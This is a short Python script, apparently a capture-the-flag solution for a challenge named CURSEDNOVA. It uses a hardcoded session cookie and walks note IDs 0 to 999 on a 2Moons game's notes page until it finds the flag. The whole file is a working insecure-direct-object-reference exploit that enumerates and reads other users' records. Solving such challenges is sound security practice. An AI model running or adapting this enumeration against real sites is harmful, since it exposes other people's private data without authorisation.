import requests
import re

COOKIE = '88f8cb605d04d1d69937f57e1b90e0b7'

def main():
    BASE_URL = 'https://uni1.cursednova.securing.pl/game.php?page=notes&mode=detail&id='
    for i in range(1000):
        resp = requests.get(BASE_URL + str(i), cookies={'2Moons': COOKIE})
        resp.raise_for_status()
        match = re.search(r'CURSEDNOVA\{.*}', resp.text)
        if match:
            print(i, match.group(0))
            break


if __name__ == '__main__':
    main()